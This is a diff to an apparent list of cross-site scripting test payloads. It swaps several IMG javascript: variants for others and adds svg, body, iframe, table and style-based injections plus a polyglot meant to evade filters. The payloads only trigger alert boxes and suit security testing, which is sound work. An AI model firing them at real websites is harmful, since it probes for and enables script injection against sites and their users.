@@ -1,6 +1,10 @@
 <ScRiPt>alert(1)</sCriPt>
-<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
-<IMG SRC=”javascript:alert(‘XSS’);”>
-<IMG SRC=javascript:alert(&quot;XSS&quot;)>
-<IMG SRC=javascript:alert(‘XSS’)>      
+<IMG SRC=`javascript:alert('XSS')`>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 <img src=xss onerror=alert(1)>
+<svg/onload=alert('XSS')>
+<BODY ONLOAD=alert('XSS')>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
